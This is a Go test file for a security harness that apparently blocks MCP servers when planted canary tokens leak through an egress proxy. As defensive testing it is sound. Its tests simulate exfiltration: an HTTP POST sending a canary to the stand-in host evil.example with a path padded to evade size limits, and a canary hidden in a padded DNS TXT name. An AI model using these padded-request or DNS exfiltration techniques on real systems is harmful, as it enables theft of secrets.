package harness

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/JairJosafath/mcp-customs/src/internal/canary"
	"github.com/JairJosafath/mcp-customs/src/internal/egress"
	"github.com/JairJosafath/mcp-customs/src/internal/findings"
	"github.com/JairJosafath/mcp-customs/src/internal/verdict"
)

// decided is the verdict code gives a run's observations, the model at pass.
func decided(t *testing.T, obs []Observation, set canary.Set) verdict.Result {
	t.Helper()
	return verdict.Decide(verdict.Input{Code: findings.FromObservations(asFindings(t, obs), set), ModelVerdict: verdict.Pass})
}

// One observation that would block, larger than every byte cap, is kept
// compact, never dropped: the leak still blocks.
func TestATellingObservationOverEveryCapIsKeptCompactAndBlocks(t *testing.T) {
	key := canary.Set{{Kind: canary.GitHubToken, Value: "test-github-token"}}
	padding := strings.Repeat("<", 512<<10) // 3 MiB encoded
	tests := []struct {
		name   string
		kind   ObservationKind
		detail any
	}{
		{"a canary the proxy found, in a request with a padded path", ObservedHTTP, egress.HTTPDetail{
			Method: "POST", Host: "evil.example", Path: "/" + padding,
			Canaries: []findings.Match{{Canary: canary.GitHubToken, Encoding: findings.Plain}},
		}},
		{"a canary in a padded DNS name", ObservedDNS, egress.DNSDetail{Name: padding + key[0].Value + ".evil.example", Type: "TXT"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := newRecorder(func() time.Time { return testNow })
			r.setCanaries(key)
			r.add(tt.kind, tt.detail)
			all := r.all()
			if got := decided(t, all, key); got.Verdict != verdict.Block {
				t.Errorf("verdict %s with findings %+v, want block", got.Verdict, got.Findings)
			}
			if raw := mustJSON(t, all); len(raw) > maxTellingObservation {
				t.Errorf("the observations encode to %d bytes, want the leak kept compact", len(raw))
			}
		})
	}
}

// The same, end to end: a server sends a canary through the egress proxy
// in a request whose path is padded to the header limit with characters
// JSON escapes sixfold.
func TestALeakInARequestWithAPaddedPathBlocks(t *testing.T) {
	eg, l := startEgress(t, t.TempDir(), net.DefaultResolver)
	run := newIdleRunWith(t, &fakeInstaller{}, func(c *Config) { c.Egress = eg })
	if status, body := run.hook(t, "POST", HooksPrefix+"run", runHookRequest(t, testToken, testCanaries)); status != http.StatusOK {
		t.Fatalf("POST /run = %d %s", status, body)
	}
	conn, err := net.Dial("tcp", l.Proxy.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	body := "t=" + testCanaries[0].Value
	path := "/" + strings.Repeat("<", 1<<20-8192)
	if _, err := fmt.Fprintf(conn, "POST http://evil.example%s HTTP/1.1\r\nHost: evil.example\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", path, len(body), body); err != nil {
		t.Fatal(err)
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		t.Fatal(err)
	}
	_ = resp.Body.Close()
	_, got := run.do(t, http.MethodGet, "/observations", nil)
	var obs []findings.Observation
	if err := json.Unmarshal(got["observations"], &obs); err != nil {
		t.Fatal(err)
	}
	result := verdict.Decide(verdict.Input{Code: findings.FromObservations(obs, canaryList(testCanaries)), ModelVerdict: verdict.Pass})
	if result.Verdict != verdict.Block {
		t.Errorf("proxy answered %s; verdict %s with findings %+v, want block", resp.Status, result.Verdict, result.Findings)
	}
}
